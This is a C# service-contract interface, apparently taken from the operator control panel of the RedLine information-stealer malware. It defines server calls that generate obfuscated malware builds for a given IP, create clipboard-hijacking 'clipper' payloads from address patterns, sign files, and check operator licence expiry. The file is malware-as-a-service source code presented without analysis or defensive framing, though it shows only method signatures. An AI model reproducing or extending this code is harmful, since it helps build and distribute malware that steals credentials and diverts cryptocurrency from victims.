using System;
using System.Collections.Generic;
using System.ServiceModel;
using System.Threading.Tasks;
using RedLine.SharedModels;

namespace RedLine.MainPanel.Models.Communication;

[ServiceContract(Name = "IMainServer", SessionMode = SessionMode.Required)]
public interface IMainServer
{
	[OperationContract(Name = "Init")]
	Task<bool> Init(string arg1, string arg2);

	[OperationContract(Name = "SignFile")]
	Task<byte[]> SignFile(ClientData client, byte[] file);

	[OperationContract(Name = "CreateBuildByVersion")]
	Task<byte[]> CreateBuildByVersion(ClientData client, string ip, string buildId, string message, bool byParts, bool obfuscate);

	[OperationContract(Name = "GetPartnersPosts")]
	Task<List<AdvertItem>> GetPartnersPosts();

	[OperationContract(Name = "CheckConnect")]
	Task<string> CheckConnect(ClientData client, string ip);

	[OperationContract(Name = "CreateClipper")]
	Task<byte[]> CreateClipper(ClientData client, string[] patterns);

	[OperationContract(Name = "Connect")]
	Task<string> Connect(string arg1, string arg2, string arg3);

	[OperationContract(Name = "CheckExpire")]
	Task<DateTime> CheckExpire(string login);

	[OperationContract]
	Task<bool> IsAlive();
}
